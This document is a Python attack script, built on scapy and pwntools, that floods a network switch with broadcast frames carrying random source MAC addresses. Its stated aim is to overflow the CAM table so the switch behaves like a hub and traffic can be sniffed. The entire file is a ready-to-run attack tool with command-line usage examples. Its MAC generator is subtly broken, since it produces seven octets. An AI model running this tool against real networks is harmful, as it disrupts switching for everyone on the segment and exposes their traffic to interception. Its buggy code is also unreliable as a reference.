#!/usr/bin/env python3

from scapy.all import *
import argparse
import random
import sys
import os
import time
import signal
from termcolor import colored
from pwn import *

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def handler(sig, frame):
    print(colored("\n[!] Stopping...\n", 'red'))
    sys.exit(0)

signal.signal(signal.SIGINT, handler)

def get_arguments():
    parser = argparse.ArgumentParser(
        description="MAC Flooding Attack - CAM Table Overflow",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 mac_flood.py -i eth0
  sudo python3 mac_flood.py --interface eth0 --count 10000 --delay 0.001
        """
    )
    parser.add_argument("-i", "--interface", required=True,
                        help="Network interface (e.g., eth0, wlan0)")
    parser.add_argument("-c", "--count", type=int, default=0,
                        help="Number of packets to send (0 = infinite, default: 0)")
    parser.add_argument("-d", "--delay", type=float, default=0.001,
                        help="Delay between packets in seconds (default: 0.001)")
    
    return parser.parse_args()

def generate_random_mac():
    """Generates a random MAC address"""
    return "02:%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255), random.randint(0, 255),
        random.randint(0, 255), random.randint(0, 255),
        random.randint(0, 255), random.randint(0, 255)
    )

def mac_flood_attack(interface, count, delay):
    """Executes MAC flooding attack"""
    print(colored(f"[*] Starting MAC Flooding attack on {interface}", 'blue'))
    print(colored("[!] This will overflow the switch CAM table", 'red'))
    print(colored("[!] When successful, the switch will act as a hub", 'yellow'))
    print(f"[*] Delay between packets: {delay}s")
    
    if count == 0:
        print(colored("[*] Mode: Infinite (Press Ctrl+C to stop)\n", 'yellow'))
    else:
        print(colored(f"[*] Mode: Limited to {count} packets\n", 'yellow'))
    
    sent = 0
    p1 = log.progress("MAC Flooding")
    
    try:
        while True:
            if count != 0 and sent >= count:
                break
            
            # Generate random source MAC
            src_mac = generate_random_mac()
            dst_mac = "ff:ff:ff:ff:ff:ff"  # Broadcast
            
            # Create packet with random MAC
            # Using a simple Ethernet frame with dummy payload
            packet = Ether(src=src_mac, dst=dst_mac) / \
                     IP(src="1.2.3.4", dst="5.6.7.8") / \
                     ICMP()
            
            sendp(packet, iface=interface, verbose=False)
            sent += 1
            
            # Update progress every 100 packets
            if sent % 100 == 0:
                p1.status(colored(f"{sent} packets with unique MACs sent", 'cyan'))
            
            if delay > 0:
                time.sleep(delay)
        
        p1.success(colored(f"Completed: {sent} packets", 'green'))
        print(colored(f"[+] Attack finished: {sent} packets sent", 'green'))
        print(colored("[!] Check if the switch is now broadcasting traffic", 'yellow'))
        
    except KeyboardInterrupt:
        p1.success(colored(f"Stopped: {sent} packets", 'yellow'))
        print(colored(f"\n[!] Attack stopped: {sent} packets sent", 'yellow'))

def main():
    # Check root privileges
    if os.geteuid() != 0:
        print(colored("[-] Error: Root privileges required (sudo)", 'red'))
        sys.exit(1)
    
    args = get_arguments()
    
    try:
        mac_flood_attack(args.interface, args.count, args.delay)
    except Exception as e:
        print(colored(f"[-] Error: {e}", 'red'))
        sys.exit(1)

if __name__ == "__main__":
    main()
